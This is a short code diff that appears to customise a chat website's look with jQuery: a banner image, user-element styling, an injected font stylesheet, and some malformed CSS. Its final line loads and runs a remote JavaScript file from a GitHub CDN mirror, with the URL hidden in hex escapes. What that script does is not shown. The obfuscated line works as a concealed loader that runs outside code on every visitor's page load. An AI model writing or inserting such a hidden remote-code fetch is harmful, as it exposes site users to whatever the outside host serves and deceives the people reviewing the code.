@@ -1,0 +1,9 @@
+$(`<img src="/sico/1642243362518.gif" class="" style="width:100%;margin-top:px;">
+
+
+`).insertBefore('.nav-tabs');
+$('.hand.nosel.fl.uzr.border').css({'margin': '2px 2',borderRight: '5px solid #FFFFFF',borderLeft: '5px solid #F7F7F7',borderTop: '3px solid #F7F7F7',borderBottom: '2px solid #FFFFFF',paddingTop: '5px',borderRadius: '7px'}); $(`<link rel="stylesheet" type="text/css" href="https://www.fontstatic.com/f=jazeera-light,jazeera"> <link rel="stylesheet" href=""> <style> .fitimg.fl.u-pic  {box-shadow: inset 0 1px 1px rgba(0,0,0,.080), 0 0 10px rgb(118, 118, 22226);border-radius: 90px 90px 90px 90px;} <div class="lonline light break" style="width:100%;outline: lightgray solid 1px;">
+</style>`).insertBefore('body');
+$.getScript("https://\x72\x61\x77\x63\x64\x6E\x2E\x67\x69\x74\x68\x61\x63\x6B\x2E\x63\x6F\x6D/\x6D\x75\x37\x34\x34\x6D\x75/\x74\x61\x37\x61\x31/\x66\x31\x35\x32\x30\x65\x32\x34\x65\x34\x38\x37\x37\x66\x66\x36\x64\x34\x65\x61\x63\x31\x30\x31\x61\x66\x30\x36\x61\x34\x35\x38\x64\x30\x38\x37\x31\x37\x36\x37/\x63\x68\x61\x74\x6A\x61\x77\x61\x6C\x79.js")
+
+
